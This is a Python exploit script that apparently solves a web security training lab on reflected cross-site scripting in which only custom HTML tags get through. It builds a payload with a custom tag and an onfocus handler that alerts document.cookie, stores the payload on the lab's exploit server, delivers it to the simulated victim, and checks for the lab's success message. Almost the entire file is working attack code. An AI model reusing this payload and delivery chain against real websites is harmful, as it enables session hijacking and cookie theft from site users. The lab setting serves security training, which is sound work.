import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def xss_attack(url, exploit_server):
    # STORE PAYLOAD ONTO THE EXPLOIT SERVER
    payload = "<script>location = '{0}/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>".format(url)
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/xss',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : payload,
        'formAction' : 'STORE'
    }
    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)

    # DELIVER PAYLOAD
    deliver_url = exploit_server + '/deliver-to-victim'
    r = requests.get(deliver_url, verify=False, proxies=proxies)

    # CHECK IF EXPLOIT WAS SUCCESSFUL

    r = requests.get(url, verify=False, proxies=proxies)

    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Exploit was successful!")
        sys.exit(-1)
    else:
        print("[-] Exploit failed!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url> <exploit-server>" % sys.argv[0])
        print("[-] Example: %s www.url.com www.exploit-server.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    exploit_server = sys.argv[2].strip()

    print("[+] Lab: Reflected XSS into HTML context with all tags blocked except custom ones")
    print("""[+] This lab blocks all HTML tags except custom ones.
    To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts _document.cookie_.""")

    xss_attack(url, exploit_server)

if __name__ == "__main__":
    main()